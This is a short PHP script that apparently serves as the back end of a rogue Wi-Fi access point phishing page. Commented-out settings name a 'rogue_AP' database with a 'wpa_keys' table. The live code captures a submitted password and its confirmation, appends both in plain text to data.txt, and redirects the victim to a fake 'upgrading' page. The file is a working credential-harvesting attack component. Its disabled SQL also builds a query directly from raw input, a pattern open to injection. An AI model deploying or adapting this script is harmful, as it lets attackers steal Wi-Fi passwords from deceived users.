<?php
session_start();
ob_start();
/*$host="localhost";
$username="fakeap";
$pass="fakeap";
$dbname="rogue_AP";
$tbl_name="wpa_keys";

// Create connection
//$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
//if (!$conn) {
//    die("Connection failed: " . mysqli_connect_error());
//}

*/
$password1=$_POST['password1'];
$password2=$_POST['password2'];

/*$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
mysqli_close($conn);
*/
$data="Password: $password1 \n Password confirmation: $password2 \n";
$file="data.txt";
file_put_contents($file, $data, FILE_APPEND);
sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>

